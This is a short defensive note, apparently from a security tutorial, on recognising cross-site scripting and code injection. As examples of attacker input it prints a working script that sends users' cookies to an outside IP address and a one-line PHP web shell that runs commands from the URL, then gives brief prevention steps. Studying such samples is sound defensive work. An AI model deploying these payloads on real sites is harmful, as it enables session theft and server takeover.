We might see a weird amount of requests being sent to an internal "server" we don't recognize. This could be a clear indication of cross-site scripting.
Essentially, the attacker managed to inject code into our web servers, and now, when other users perform specific tasks, they might be triggering the code that was injected. This may result in cookie/token stealing.
For instance, check the following "comment" a user submitted.
```html
<script>
	window.addEventListener("load", function() {
		const url = "http://192.168.0.19:5555";
		const params = "cookie=" + encodeURIComponent(document.cookie);
		const request = new XMLHttpRequest();
		request.open("GET", url + "?" + params);
		request.send();
	});
</script>
```

Funny looking comment. This is sending the user's cookie to an unknown IP address.
The attackers might also try to get C2 through php.
```php
<?php system($_GET['cmd']); ?>
<?php echo `whoami` ?>
```

##### Preventing XSS and Code Injection
To prevent these after we detect them, do the following:
1. Sanitize and handle user input in an acceptable manner.
2. Do not interpret user input as code.
